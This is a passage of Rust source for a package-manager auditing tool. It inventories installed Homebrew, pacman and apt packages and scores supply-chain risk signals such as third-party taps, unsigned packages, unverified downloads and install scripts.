//! `postmortem system` — audit the machine's **OS-level** package managers.
//!
//! Where `scan`/`tree` read a project's committed lockfiles, `system` inspects
//! what's actually installed on *this* machine by shelling out to the package
//! manager. Homebrew is the first (and today only) backend:
//!
//! - `brew info --json=v2 --installed` — the full installed forest: **formulae**
//!   (with versions, `installed_on_request` roots, and `declared_directly`
//!   dependency edges) and **casks** (apps installed as prebuilt binaries).
//! - `brew tap-info --json --installed` — the configured **source repos** and
//!   their real git remotes. Anything beyond the official `homebrew/*` taps
//!   bypasses core review → a provenance risk.
//!
//! Two risk lenses feed the shared `tree` model:
//! - **provenance** (offline, [`analyze_signals`]): third-party taps, and for
//!   casks the extra supply-chain surface — an unverified download
//!   (`sha256 :no_check`), an insecure/`http` URL, a download host unrelated to
//!   the homepage, a `pkg`/`installer` artifact (elevated install), self-updates,
//!   deprecation.
//! - **reputation** (`--online`): the source repo's stars/age/activity/language,
//!   via the same [`crate::resolve`] resolver (formula `homepage` / cask download
//!   URL → GitHub).

use std::collections::HashMap;
use std::process::Command;

use anyhow::{Context, Result};
use owo_colors::OwoColorize;
use serde::Deserialize;

use crate::model::{DepRef, Dependency, Ecosystem, Severity};
use crate::tree::{Node, Tree};

/// Download hosts that are legitimate release mirrors, so a cask downloading
/// from them while its homepage is elsewhere is normal (not a redirect tell).
const TRUSTED_DL_HOSTS: &[&str] =
    &["github.com", "gitlab.com", "codeberg.org", "sourceforge.net", "bitbucket.org"];

/// A known OS package manager and whether it's usable on this machine.
pub struct Manager {
    pub name: &'static str,
    /// Its CLI is present on `$PATH`.
    pub available: bool,
    /// postmortem has a backend for it (only Homebrew, today).
    pub implemented: bool,
}

/// The managers we recognize. `implemented` marks the ones with a backend; the
/// rest are detected-and-reported so the roadmap is visible.
const KNOWN: &[(&str, &str, bool)] = &[
    ("homebrew", "brew", true),
    ("pacman", "pacman", true),
    ("apt", "apt", true),
    ("dnf", "dnf", false),
    ("apk", "apk", false),
    ("macports", "port", false),
];

/// Detect which known package managers are installed on this machine.
pub fn detect() -> Vec<Manager> {
    KNOWN
        .iter()
        .map(|(name, bin, implemented)| Manager {
            name,
            available: in_path(bin),
            implemented: *implemented,
        })
        .collect()
}

/// Is `bin` present as a file on any `$PATH` entry?
fn in_path(bin: &str) -> bool {
    let Some(path) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&path).any(|dir| dir.join(bin).is_file())
}

/// One configured Homebrew tap (a source repo backing installable packages).
pub struct Tap {
    /// Tap handle, e.g. `sn0walice/sshm` or `homebrew/core`.
    pub name: String,
    /// The tap's actual git remote (from `brew tap-info`), e.g.
    /// `https://github.com/Sn0wAlice/sshm`. Empty for official taps (no remote).
    pub remote: String,
    /// An official `homebrew/*` tap (core-reviewed).
    pub official: bool,
}

/// One offline system risk signal attached to a package by name: a label, its
/// severity (drives color + the flagged/unchecked split), and the points it adds
/// to the package's own risk score.
pub struct SysSignal {
    pub label: String,
    pub severity: Severity,
    pub points: u8,
}

impl SysSignal {
    fn new(label: impl Into<String>, severity: Severity, points: u8) -> Self {
        SysSignal { label: label.into(), severity, points }
    }
}

/// One configured source repo, generic across backends (a Homebrew tap, a
/// pacman repo, an apt source, …).
pub struct Repo {
    /// Handle / section name, e.g. `homebrew/core`, `core`, `sn0walice/sshm`.
    pub name: String,
    /// Its URL/remote when known (empty otherwise).
    pub url: String,
    /// A first-party / trusted source (vs. a third-party one).
    pub official: bool,
}

/// The installed inventory for one system manager, in the shared `tree` model.
pub struct Inventory {
    pub manager: &'static str,
    /// Installed packages as `Dependency` nodes.
    pub deps: Vec<Dependency>,
    /// Configured source repos.
    pub repos: Vec<Repo>,
    /// Offline risk signals per package name, merged onto the tree by [`annotate`].
    pub signals: HashMap<String, Vec<SysSignal>>,
    /// A one-line human count, e.g. `117 formula(e) + 2 cask(s)`.
    pub summary: String,
    /// A caveat to surface after loading (e.g. an un-synced pacman DB).
    pub note: Option<String>,
}

/// Options for [`inventory`].
#[derive(Default, Clone, Copy)]
pub struct Opts {
    /// Pull networked provenance during inventory (pacman's AUR RPC).
    pub online: bool,
    /// Force foreign/AUR detection past the un-synced-DB guard (pacman).
    pub force_aur: bool,
}

/// Build the installed inventory for a supported backend. Homebrew ignores
/// `opts` (its reputation comes from the shared `--online` path).
pub fn inventory(manager: &str, opts: Opts) -> Result<Inventory> {
    match manager {
        "homebrew" => brew_inventory(),
        "pacman" => pacman_inventory(opts),
        "apt" => apt_inventory(opts),
        other => anyhow::bail!("no inventory backend for '{other}'"),
    }
}

// --- Homebrew JSON (`brew info --json=v2 --installed`) --------------------------

#[derive(Deserialize, Default)]
struct BrewOut {
    #[serde(default)]
    formulae: Vec<Formula>,
    #[serde(default)]
    casks: Vec<Cask>,
}

#[derive(Deserialize)]
struct Formula {
    name: String,
    tap: Option<String>,
    #[serde(default)]
    installed: Vec<Installed>,
    #[serde(default)]
    deprecated: bool,
    #[serde(default)]
    disabled: bool,
    /// Presence means the formula installs a launchd/systemd service (persistence).
    #[serde(default)]
    service: Option<serde_json::Value>,
    #[serde(default)]
    bottle: Option<Bottle>,
}

#[derive(Deserialize)]
struct Bottle {
    #[serde(default)]
    stable: Option<BottleStable>,
}

#[derive(Deserialize)]
struct BottleStable {
    /// The registry the prebuilt binary is pulled from. Official bottles live
    /// under `ghcr.io/v2/homebrew/*`; a third-party tap can point elsewhere.
    root_url: Option<String>,
}

#[derive(Deserialize)]
struct Installed {
    version: String,
    #[serde(default)]
    installed_on_request: bool,
    #[serde(default)]
    runtime_dependencies: Vec<RuntimeDep>,
}

#[derive(Deserialize)]
struct RuntimeDep {
    full_name: String,
    /// True when the parent formula declares this dep directly (vs. pulled
    /// transitively) — the signal we use to draw a single graph edge.
    #[serde(default)]
    declared_directly: bool,
}

#[derive(Deserialize)]
struct Cask {
    token: String,
    tap: Option<String>,
    #[serde(default)]
    version: Option<String>,
    #[serde(default)]
    installed: Option<String>,
    url: Option<String>,
    /// A hex digest, or the literal `"no_check"` when the cask declares
    /// `sha256 :no_check` (an unverified download).
    sha256: Option<String>,
    homepage: Option<String>,
    #[serde(default)]
    auto_updates: Option<bool>,
    #[serde(default)]
    deprecated: bool,
    #[serde(default)]
    disabled: bool,
    /// Each entry is a one-key object naming the artifact kind (`app`, `pkg`,
    /// `installer`, `binary`, `zap`, …).
    #[serde(default)]
    artifacts: Vec<serde_json::Value>,
}

/// Read the installed Homebrew forest, casks, and taps into an [`Inventory`].
pub fn brew_inventory() -> Result<Inventory> {
    let out = Command::new("brew")
        .args(["info", "--json=v2", "--installed"])
        .output()
        .context("running `brew info --json=v2 --installed`")?;
    if !out.status.success() {
        anyhow::bail!("`brew info` failed: {}", String::from_utf8_lossy(&out.stderr).trim());
    }
    let (taps, tap_remote) = read_tap_info();
    let Parsed { deps, casks, mut signals, third_party } =
        analyze(&out.stdout, &tap_remote).context("parsing brew JSON")?;

    // Static-analyze the install recipe of each third-party package (its brew
    // Ruby) — the untrusted install code. Core/official recipes are skipped.
    for (name, is_cask) in &third_party {
        for sig in analyze_install_code(name, *is_cask) {
            signals.entry(name.clone()).or_default().push(sig);
        }
    }

    // Version drift is a separate `brew outdated` query, merged into the signals.
    for (name, (installed, current)) in read_outdated() {
        signals.entry(name).or_default().push(outdated_signal(&installed, &current));
    }
    let summary = format!("{} formula(e) + {casks} cask(s)", deps.len() - casks);
    let repos = taps
        .into_iter()
        .map(|t| Repo { name: t.name, url: t.remote, official: t.official })
        .collect();
    Ok(Inventory { manager: "homebrew", deps, repos, signals, summary, note: None })
}

/// The output of [`analyze`]: the packages (formulae forest + cask roots), the
/// cask count, the offline risk signals keyed by package name, and the list of
/// third-party packages `(name, is_cask)` whose install recipe should be
/// statically analyzed (core/official recipes are review-gated, so skipped).
struct Parsed {
    deps: Vec<Dependency>,
    casks: usize,
    signals: HashMap<String, Vec<SysSignal>>,
    third_party: Vec<(String, bool)>,
}

/// Turn `brew info --json=v2` output into the dependency forest, the cask count,
/// and the offline risk signals. `tap_remote` maps a tap handle to its real git
/// remote (used to point a third-party package at its tap's repo). Split from the
/// shell-out so it's unit-testable against a fixture.
fn analyze(json: &[u8], tap_remote: &HashMap<String, String>) -> Result<Parsed> {
    let parsed: BrewOut = serde_json::from_slice(json)?;
    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    let mut third_party: Vec<(String, bool)> = Vec::new();

    // --- formulae: the dependency forest ---
    let version: HashMap<&str, &str> = parsed
        .formulae
        .iter()
        .filter_map(|f| f.installed.first().map(|i| (f.name.as_str(), i.version.as_str())))
        .collect();

    // Invert declared-direct edges into a parent map: dep → its declaring
    // formulae. tree::build re-inverts this into the child forest.
    let mut parents: HashMap<String, Vec<DepRef>> = HashMap::new();
    for f in &parsed.formulae {
        let Some(inst) = f.installed.first() else { continue };
        for rd in &inst.runtime_dependencies {
            if rd.declared_directly && version.contains_key(rd.full_name.as_str()) {
                parents
                    .entry(rd.full_name.clone())
                    .or_default()
                    .push((f.name.clone(), inst.version.clone()));
            }
        }
    }

    let mut deps = Vec::with_capacity(parsed.formulae.len() + parsed.casks.len());
    for f in &parsed.formulae {
        let Some(inst) = f.installed.first() else { continue };
        // Third-party tap → provenance signal + carry the tap's remote so the
        // resolver assesses the tap repo instead of reporting "no repository",
        // and mark it for install-recipe analysis.
        let tap = f.tap.as_deref().filter(|t| !is_official_tap(t));
        if let Some(t) = tap {
            push_signal(&mut signals, &f.name, third_party_tap(t));
            third_party.push((f.name.clone(), false));
            if let Some(sig) = tap_remote.get(t).and_then(|r| tap_remote_signal(r)) {
                push_signal(&mut signals, &f.name, sig);
            }
        }
        if f.deprecated || f.disabled {
            push_signal(&mut signals, &f.name, deprecated_signal());
        }
        // Persistence: installs a background service that runs at boot/login.
        if f.service.is_some() {
            push_signal(&mut signals, &f.name, service_signal());
        }
        // Bottle provenance: a prebuilt binary pulled from a non-official host.
        if let Some(host) = f
            .bottle
            .as_ref()
            .and_then(|b| b.stable.as_ref())
            .and_then(|s| s.root_url.as_deref())
            .filter(|r| !is_official_bottle(r))
            .and_then(host_domain)
        {
            push_signal(&mut signals, &f.name, unofficial_bottle_signal(&host));
        }
        deps.push(Dependency {
            name: f.name.clone(),
            version: inst.version.clone(),
            ecosystem: Ecosystem::Brew,
            direct: inst.installed_on_request,
            resolved_url: tap.and_then(|t| tap_remote.get(t).cloned()),
            integrity: None,
            parents: parents.remove(&f.name).unwrap_or_default(),
        });
    }

    // --- casks: flat roots + the extra download/artifact risk surface ---
    let casks = parsed.casks.len();
    for c in &parsed.casks {
        let mut sigs = cask_signals(c);
        if let Some(tap) = c.tap.as_deref().filter(|t| !is_official_tap(t)) {
            sigs.push(third_party_tap(tap));
            third_party.push((c.token.clone(), true));
            if let Some(sig) = tap_remote.get(tap).and_then(|r| tap_remote_signal(r)) {
                sigs.push(sig);
            }
        }
        if !sigs.is_empty() {
            signals.entry(c.token.clone()).or_default().extend(sigs);
        }
        deps.push(Dependency {
            name: c.token.clone(),
            version: c.installed.clone().or_else(|| c.version.clone()).unwrap_or_default(),
            ecosystem: Ecosystem::Brew,
            direct: true, // casks are always user-installed
            // The download URL is often a GitHub release → resolves to the repo.
            resolved_url: c.url.clone(),
            integrity: c.sha256.clone(),
            parents: Vec::new(),
        });
    }

    Ok(Parsed { deps, casks, signals, third_party })
}

/// The provenance signal for a package installed from a non-official tap.
fn third_party_tap(tap: &str) -> SysSignal {
    SysSignal::new(format!("third-party-tap ({tap})"), Severity::Medium, 30)
}

/// A deprecated/disabled package — unmaintained, likely to accrue unfixed bugs.
fn deprecated_signal() -> SysSignal {
    SysSignal::new("deprecated", Severity::Medium, 20)
}

/// An installed version behind the current one — running old code means missing
/// upstream (including security) fixes. Mild on its own.
fn outdated_signal(installed: &str, current: &str) -> SysSignal {
    SysSignal::new(format!("outdated ({installed} → {current})"), Severity::Low, 10)
}

/// The formula installs a launchd/systemd service — it runs automatically at
/// boot/login. Higher attack surface; informational (many are legitimate).
fn service_signal() -> SysSignal {
    SysSignal::new("installs-service (runs at boot/login)", Severity::Info, 0)
}

/// The prebuilt binary is pulled from a bottle registry outside Homebrew's
/// official `ghcr.io/v2/homebrew/*` — an arbitrary binary host.
fn unofficial_bottle_signal(host: &str) -> SysSignal {
    SysSignal::new(format!("unofficial-bottle ({host})"), Severity::Medium, 30)
}

/// Is a bottle `root_url` Homebrew's official registry?
fn is_official_bottle(root_url: &str) -> bool {
    root_url.contains("ghcr.io/v2/homebrew/")
}

/// Flag a tap whose git remote is insecure (`http`) or on a host we can't vouch
/// for. `None` for an https remote on a known code host.
fn tap_remote_signal(remote: &str) -> Option<SysSignal> {
    if remote.starts_with("http://") {
        return Some(SysSignal::new("insecure-tap-remote (http)", Severity::High, 40));
    }
    match host_domain(remote) {
        Some(host) if !TRUSTED_DL_HOSTS.contains(&host.as_str()) => {
            Some(SysSignal::new(format!("exotic-tap-host ({host})"), Severity::Low, 10))
        }
        _ => None,
    }
}

fn push_signal(map: &mut HashMap<String, Vec<SysSignal>>, name: &str, sig: SysSignal) {
    map.entry(name.to_string()).or_default().push(sig);
}

/// Cask-specific risk signals derived from its metadata: the download-and-run
/// surface a cask carries that a source-built formula doesn't.
fn cask_signals(c: &Cask) -> Vec<SysSignal> {
    let mut out = Vec::new();

    // An unverified download — brew runs whatever bytes arrive, no integrity pin.
    if c.sha256.as_deref() == Some("no_check") {
        out.push(SysSignal::new("unverified-download (sha256 :no_check)", Severity::High, 40));
    }
    if let Some(url) = &c.url {
        if url.starts_with("http://") {
            out.push(SysSignal::new("insecure-url (http)", Severity::High, 40));
        }
        // Download host unrelated to the homepage and not a known release mirror.
        if let (Some(home), Some(dl)) =
            (c.homepage.as_deref().and_then(host_domain), host_domain(url))
            && dl != home
            && !TRUSTED_DL_HOSTS.contains(&dl.as_str())
        {
            out.push(SysSignal::new(format!("download-host-mismatch ({dl})"), Severity::Low, 10));
        }
    }
    // A pkg/installer artifact runs an installer (elevated) rather than a plain
    // app drop — worth surfacing (informational).
    if c.artifacts.iter().any(is_installer_artifact) {
        out.push(SysSignal::new("runs-installer", Severity::Info, 0));
    }
    // Self-updating outside brew — later versions bypass this audit.
    if c.auto_updates == Some(true) {
        out.push(SysSignal::new("auto-updates", Severity::Info, 0));
    }
    if c.deprecated || c.disabled {
        out.push(deprecated_signal());
    }
    out
}

/// `brew outdated --json` → installed packages behind their current version,
/// mapped `name → (installed, current)`. Best-effort: a failure yields none.
fn read_outdated() -> HashMap<String, (String, String)> {
    #[derive(Deserialize)]
    struct Out {
        name: String,
        #[serde(default)]
        installed_versions: Vec<String>,
        #[serde(default)]
        current_version: Option<String>,
    }
    #[derive(Deserialize, Default)]
    struct OutAll {
        #[serde(default)]
        formulae: Vec<Out>,
        #[serde(default)]
        casks: Vec<Out>,
    }
    let Ok(out) = Command::new("brew").args(["outdated", "--json"]).output() else {
        return HashMap::new();
    };
    if !out.status.success() {
        return HashMap::new();
    }
    let all: OutAll = serde_json::from_slice(&out.stdout).unwrap_or_default();
    all.formulae
        .into_iter()
        .chain(all.casks)
        .filter_map(|x| {
            let cur = x.current_version?;
            let inst = x.installed_versions.first().cloned().unwrap_or_default();
            Some((x.name, (inst, cur)))
        })
        .collect()
}

// --- pacman backend (`pacman -Qi`) -------------------------------------------

/// Read the installed pacman forest into an [`Inventory`]. `pacman -Qi` dumps
/// every installed package's info in one call: name, version, deps, URL,
/// signature status, install-reason (explicit vs pulled-in), and whether it
/// ships an install hook. `online` additionally enriches foreign/AUR packages
/// via the AUR RPC.
pub fn pacman_inventory(opts: Opts) -> Result<Inventory> {
    let out = Command::new("pacman").arg("-Qi").output().context("running `pacman -Qi`")?;
    if !out.status.success() {
        anyhow::bail!("`pacman -Qi` failed: {}", String::from_utf8_lossy(&out.stderr).trim());
    }
    let (deps, mut signals) = pacman_graph(&String::from_utf8_lossy(&out.stdout));

    // Foreign packages (not from an official repo) = AUR builds / manual installs
    // — the untrusted surface. An un-synced sync-DB reports ~everything foreign,
    // which is useless, so it's skipped unless forced.
    let raw = read_foreign();
    let unsynced = !raw.is_empty() && raw.len() * 10 >= deps.len() * 9;
    let mut note = None;
    let foreign = if unsynced && !opts.force_aur {
        note = Some(
            "package DB not synced, so AUR/foreign detection is unavailable. \
             Run `sudo pacman -Sy` first, or pass --force-aur to scan anyway."
                .to_string(),
        );
        Vec::new()
    } else {
        raw
    };

    if !foreign.is_empty() {
        let aur = if opts.online { aur_info(&foreign) } else { HashMap::new() };
        let version_of: HashMap<&str, &str> =
            deps.iter().map(|d| (d.name.as_str(), d.version.as_str())).collect();
        for name in &foreign {
            for sig in foreign_signals(aur.get(name)) {
                push_signal(&mut signals, name, sig);
            }
            // Static-analyze the local `.install` hook (the shell that runs on
            // this machine at install/upgrade/removal) — offline.
            if let Some(ver) = version_of.get(name.as_str()) {
                for sig in analyze_pacman_install(name, ver) {
                    push_signal(&mut signals, name, sig);
                }
            }
            // Static-analyze the AUR PKGBUILD (the untrusted build recipe) — online.
            if opts.online
                && aur.contains_key(name)
                && let Some(pkgbuild) = fetch_pkgbuild(name)
            {
                for sig in analyze_recipe(name, &pkgbuild, "sh") {
                    push_signal(&mut signals, name, sig);
                }
            }
        }
    }

    // Version drift (needs a synced DB; best-effort).
    for (name, (old, new)) in read_pacman_outdated() {
        signals.entry(name).or_default().push(outdated_signal(&old, &new));
    }

    let explicit = deps.iter().filter(|d| d.direct).count();
    let extra = if foreign.is_empty() {
        String::new()
    } else {
        format!(", {} foreign", foreign.len())
    };
    let summary = format!("{} package(s) ({explicit} explicit{extra})", deps.len());
    Ok(Inventory { manager: "pacman", deps, repos: pacman_repos(), signals, summary, note })
}

// --- AUR (foreign packages + aur.archlinux.org RPC) --------------------------

const UA: &str = concat!("postmortem/", env!("CARGO_PKG_VERSION"));

/// Installed packages not provided by any sync repo (`pacman -Qm`) — AUR builds
/// and manual installs. The caller applies the un-synced-DB guard.
fn read_foreign() -> Vec<String> {
    let Ok(out) = Command::new("pacman").arg("-Qm").output() else {
        return Vec::new();
    };
    if !out.status.success() {
        return Vec::new();
    }
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|l| l.split_whitespace().next().map(str::to_string))
        .collect()
}

#[derive(Deserialize, Default)]
struct AurResp {
    #[serde(default)]
    results: Vec<AurPkg>,
}

#[derive(Deserialize)]
struct AurPkg {
    #[serde(rename = "Name")]
    name: String,
    #[serde(rename = "Maintainer")]
    maintainer: Option<String>,
    #[serde(rename = "OutOfDate")]
    out_of_date: Option<i64>,
    #[serde(rename = "NumVotes")]
    num_votes: Option<i64>,
}

/// Query the AUR RPC v5 `info` endpoint (batched) for a set of package names.
/// Best-effort: network failures yield an empty map.
fn aur_info(names: &[String]) -> HashMap<String, AurPkg> {
    let agent = ureq::AgentBuilder::new().timeout(std::time::Duration::from_secs(15)).build();
    let mut out = HashMap::new();
    for chunk in names.chunks(120) {
        let query: String = chunk.iter().map(|n| format!("&arg[]={n}")).collect();
        let url =
            format!("https://aur.archlinux.org/rpc/v5/info?{}", query.trim_start_matches('&'));
        let Ok(resp) = agent.get(&url).set("User-Agent", UA).call() else {
            continue;
        };
        let Ok(text) = resp.into_string() else { continue };
        if let Ok(parsed) = serde_json::from_str::<AurResp>(&text) {
            out.extend(parsed.results.into_iter().map(|p| (p.name.clone(), p)));
        }
    }
    out
}

/// Static-analyze a foreign package's local `.install` hook (shell), if any. The
/// hook lives on-disk and runs on this machine, so this is offline.
fn analyze_pacman_install(name: &str, version: &str) -> Vec<SysSignal> {
    let path = format!("/var/lib/pacman/local/{name}-{version}/install");
    match std::fs::read_to_string(&path) {
        Ok(code) => analyze_recipe(name, &code, "sh"),
        Err(_) => Vec::new(),
    }
}

/// Fetch a package's AUR PKGBUILD (its untrusted build recipe). Best-effort.
fn fetch_pkgbuild(name: &str) -> Option<String> {
    let agent = ureq::AgentBuilder::new().timeout(std::time::Duration::from_secs(15)).build();
    let url = format!("https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h={name}");
    agent.get(&url).set("User-Agent", UA).call().ok()?.into_string().ok()
}

/// `pacman -Qu` → packages behind the synced repos, `name → (installed, current)`.
/// Best-effort: needs a synced DB, empty otherwise.
fn read_pacman_outdated() -> HashMap<String, (String, String)> {
    let Ok(out) = Command::new("pacman").arg("-Qu").output() else {
        return HashMap::new();
    };
    if !out.status.success() {
        return HashMap::new();
    }
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|l| {
            // "name old_ver -> new_ver [ignored]"
            let mut p = l.split_whitespace();
            let name = p.next()?.to_string();
            let old = p.next()?.to_string();
            if p.next() != Some("->") {
                return None;
            }
            Some((name, (old, p.next()?.to_string())))
        })
        .collect()
}

/// Signals for one foreign package: always `foreign-package`, plus AUR RPC
/// provenance (orphaned / out-of-date / unpopular) when the metadata is present.
fn foreign_signals(aur: Option<&AurPkg>) -> Vec<SysSignal> {
    let mut v = vec![SysSignal::new(
        "foreign-package (not from an official repo)",
        Severity::Medium,
        30,
    )];
    if let Some(p) = aur {
        if p.maintainer.is_none() {
            v.push(SysSignal::new("aur-orphaned (no maintainer)", Severity::Medium, 30));
        }
        if p.out_of_date.is_some() {
            v.push(SysSignal::new("aur-out-of-date", Severity::Medium, 20));
        }
        let votes = p.num_votes.unwrap_or(0);
        if votes < 10 {
            v.push(SysSignal::new(format!("aur-unpopular ({votes} votes)"), Severity::Low, 10));
        }
    }
    v
}

/// Parse `pacman -Qi` output (blank-line-separated `Key : Value` blocks) into a
/// dependency forest + offline signals (`unsigned`, `install-script`).
fn pacman_graph(text: &str) -> (Vec<Dependency>, HashMap<String, Vec<SysSignal>>) {
    struct P {
        name: String,
        version: String,
        url: String,
        depends: Vec<String>,
        explicit: bool,
        unsigned: bool,
        has_install: bool,
    }
    let mut pkgs: Vec<P> = Vec::new();
    for block in text.split("\n\n") {
        let (mut name, mut version, mut url) = (String::new(), String::new(), String::new());
        let (mut depends, mut explicit, mut unsigned, mut has_install) =
            (Vec::new(), false, false, false);
        for line in block.lines() {
            let Some((k, v)) = line.split_once(':') else { continue };
            let (k, v) = (k.trim(), v.trim());
            match k {
                "Name" => name = v.to_string(),
                "Version" => version = v.to_string(),
                "URL" => url = v.to_string(),
                "Depends On" if v != "None" => {
                    depends = v.split_whitespace().filter_map(pacman_dep_name).collect();
                }
                "Install Reason" => explicit = v.starts_with("Explicitly"),
                "Validated By" => unsigned = v == "None",
                "Install Script" => has_install = v == "Yes",
                _ => {}
            }
        }
        if !name.is_empty() {
            pkgs.push(P { name, version, url, depends, explicit, unsigned, has_install });
        }
    }

    let installed: HashMap<&str, &str> =
        pkgs.iter().map(|p| (p.name.as_str(), p.version.as_str())).collect();
    let mut parents: HashMap<String, Vec<DepRef>> = HashMap::new();
    for p in &pkgs {
        for d in &p.depends {
            if installed.contains_key(d.as_str()) {
                parents.entry(d.clone()).or_default().push((p.name.clone(), p.version.clone()));
            }
        }
    }

    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    let mut deps = Vec::with_capacity(pkgs.len());
    for p in &pkgs {
        if p.unsigned {
            push_signal(&mut signals, &p.name, SysSignal::new("unsigned", Severity::High, 40));
        }
        if p.has_install {
            push_signal(
                &mut signals,
                &p.name,
                SysSignal::new("install-script (runs code at install)", Severity::Info, 0),
            );
        }
        deps.push(Dependency {
            name: p.name.clone(),
            version: p.version.clone(),
            ecosystem: Ecosystem::Pacman,
            direct: p.explicit,
            resolved_url: (!p.url.is_empty()).then(|| p.url.clone()),
            integrity: None,
            parents: parents.remove(&p.name).unwrap_or_default(),
        });
    }
    (deps, signals)
}

/// A pacman `Depends On` token → package name: strip a version constraint
/// (`glibc>=2.0` → `glibc`) and drop soname deps (`libreadline.so=8-64`), which
/// are provided by an already-listed package.
fn pacman_dep_name(tok: &str) -> Option<String> {
    if tok.contains(".so") {
        return None;
    }
    let name = tok.split(['>', '<', '=']).next()?.trim();
    (!name.is_empty()).then(|| name.to_string())
}

/// Configured pacman repos from `/etc/pacman.conf`. Arch/ALARM official sections
/// are trusted; anything else is third-party.
fn pacman_repos() -> Vec<Repo> {
    const OFFICIAL: &[&str] = &[
        "core", "extra", "multilib", "testing", "core-testing", "extra-testing",
        "multilib-testing", "community", "community-testing", "alarm", "aur-disabled",
    ];
    let Ok(text) = std::fs::read_to_string("/etc/pacman.conf") else {
        return Vec::new();
    };
    text.lines()
        .filter_map(|l| l.trim().strip_prefix('[')?.strip_suffix(']').map(str::to_string))
        .filter(|s| s != "options")
        .map(|s| {
            let official = OFFICIAL.contains(&s.as_str());
            Repo { name: s, url: String::new(), official }
        })
        .collect()
}

// --- apt / dpkg backend ------------------------------------------------------

/// Read the installed dpkg forest into an [`Inventory`]. `dpkg-query -W` dumps
/// every package (name, version, deps, homepage) in one call; `apt-mark
/// showmanual` marks the direct set; `apt-cache policy` reveals which packages
/// come from a non-official source (PPA / manual `.deb`).
pub fn apt_inventory(opts: Opts) -> Result<Inventory> {
    let out = Command::new("dpkg-query")
        .args(["-W", "-f", "${Package}\t${Version}\t${Depends}\t${Pre-Depends}\t${Homepage}\n"])
        .output()
        .context("running `dpkg-query -W`")?;
    if !out.status.success() {
        anyhow::bail!("`dpkg-query` failed: {}", String::from_utf8_lossy(&out.stderr).trim());
    }
    let manual = apt_manual();
    let deps = apt_graph(&String::from_utf8_lossy(&out.stdout), &manual);
    let names: Vec<String> = deps.iter().map(|d| d.name.clone()).collect();

    // Provenance per package (non-official source + archive component), plus the
    // held / foreign-arch sets: the provenance & source surface. ("Obsolete" — a
    // package no longer in any archive — is *the same observable state* as a bare
    // `.deb`: apt-cache policy shows only /var/lib/dpkg/status for both, so it is
    // already reported as `third-party-source (manual)` rather than mislabeling
    // every sideloaded vendor `.deb` as obsolete.)
    let prov = apt_provenance(&names);
    let held = apt_held();
    let foreign = apt_foreign_arch();
    // Execution & privilege surface: what each package's installed files set up
    // (services, timers, auth config, setuid bins) + file-hijacking diversions.
    let list_index = apt_list_index();
    let setuid = apt_setuid_files();
    let diversions = apt_diversions();
    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    for d in &deps {
        let source = prov.get(&d.name).and_then(|p| p.source.clone());
        // Non-official source (PPA / manually-installed .deb) = the untrusted surface.
        if let Some(src) = &source {
            push_signal(
                &mut signals,
                &d.name,
                SysSignal::new(format!("third-party-source ({src})"), Severity::Medium, 30),
            );
        }
        // Community / non-free archive component (universe, multiverse, non-free…):
        // installed from an official host but a less-curated section.
        if let Some(comp) = prov.get(&d.name).and_then(|p| p.component.as_deref())
            && is_community_component(comp)
        {
            push_signal(
                &mut signals,
                &d.name,
                SysSignal::new(format!("component ({comp})"), Severity::Info, 0),
            );
        }
        // Held back: excluded from upgrades, so stuck on its current version.
        if held.contains(&d.name) {
            push_signal(
                &mut signals,
                &d.name,
                SysSignal::new("held (upgrades pinned off)", Severity::Low, 10),
            );
        }
        // Installed solely for a non-native architecture (e.g. a pure i386 package
        // on amd64): extra, easily-overlooked surface.
        if let Some(arch) = foreign.get(&d.name) {
            push_signal(
                &mut signals,
                &d.name,
                SysSignal::new(format!("foreign-arch ({arch})"), Severity::Low, 5),
            );
        }
        // Maintainer scripts (preinst/postinst/…): install-time code execution.
        let scripts = apt_scripts(&d.name);
        if !scripts.is_empty() {
            push_signal(
                &mut signals,
                &d.name,
                SysSignal::new("install-script (runs code at install)", Severity::Info, 0),
            );
            // Static-analyze them for third-party packages (the untrusted ones).
            if source.is_some() {
                for sig in analyze_recipe(&d.name, &scripts, "sh") {
                    push_signal(&mut signals, &d.name, sig);
                }
            }
        }
        // Execution & privilege: the boot/login/scheduled/auth/setuid surface a
        // package sets up through the files it ships.
        if let Some(paths) = list_index.get(&d.name) {
            let files = read_pkg_files(paths);
            for sig in persistence_signals(&files, &setuid) {
                push_signal(&mut signals, &d.name, sig);
            }
        }
        // Diverting another package's file in place of its own is a hijack vector.
        if let Some(path) = diversions.get(&d.name) {
            push_signal(
                &mut signals,
                &d.name,
                SysSignal::new(format!("dpkg-divert (overrides {path})"), Severity::Medium, 20),
            );
        }
    }

    for (name, (old, new)) in apt_outdated() {
        signals.entry(name).or_default().push(outdated_signal(&old, &new));
    }

    let _ = opts; // apt reputation comes from the shared `--online` path
    let direct = deps.iter().filter(|d| d.direct).count();
    let summary = format!("{} package(s) ({direct} manually installed)", deps.len());

    // Trust caveats: sources that disable signature checks, and custom keys added
    // to the apt keyring (extending trust beyond the official archives).
    let mut warnings = Vec::new();
    let untrusted = apt_untrusted_sources();
    if untrusted > 0 {
        warnings.push(format!(
            "{untrusted} apt source(s) set [trusted=yes] (signature verification disabled)"
        ));
    }
    let keys = apt_custom_keys();
    if keys > 0 {
        warnings.push(format!("{keys} custom signing key(s) added to the apt keyring"));
    }
    let pins = apt_pins();
    if pins > 0 {
        warnings.push(format!(
            "{pins} apt pin(s) configured (/etc/apt/preferences): version/source overrides"
        ));
    }
    // Signature & integrity caveats.
    let repos = apt_repos();
    let http = repos.iter().filter(|r| r.name.starts_with("http://")).count();
    if http > 0 {
        warnings.push(format!("{http} apt source(s) over http (no transport encryption)"));
    }
    if apt_legacy_keyring() {
        warnings
            .push("legacy monolithic keyring /etc/apt/trusted.gpg in use (trusts every source)".into());
    }
    let expired = apt_expired_keys();
    if expired > 0 {
        warnings.push(format!("{expired} expired signing key(s) in the apt keyring"));
    }
    let modified = apt_modified_files();
    if modified > 0 {
        warnings.push(format!("{modified} installed file(s) modified since install (md5 mismatch)"));
    }
    let note = (!warnings.is_empty()).then(|| warnings.join("; "));

    Ok(Inventory { manager: "apt", deps, repos, signals, summary, note })
}

/// Count apt sources that disable signature verification (`[trusted=yes]` in a
/// classic line, or `Trusted: yes` in deb822) — a real integrity risk.
